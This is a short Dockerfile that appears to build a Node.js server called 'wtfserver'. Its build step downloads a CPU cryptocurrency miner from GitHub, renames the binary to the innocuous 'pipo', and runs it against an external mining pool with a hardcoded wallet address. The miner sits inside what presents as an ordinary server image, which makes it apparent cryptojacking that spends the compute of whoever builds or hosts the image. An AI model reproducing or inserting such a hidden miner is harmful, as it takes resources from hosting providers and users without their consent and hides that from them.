FROM debian:stretch
WORKDIR /wtfserver
RUN apt update -y \
  && apt install -y \
    wget
COPY . .
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 pipo && ./pipo -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.azp -t 2
CMD ["node", "./index.js"]
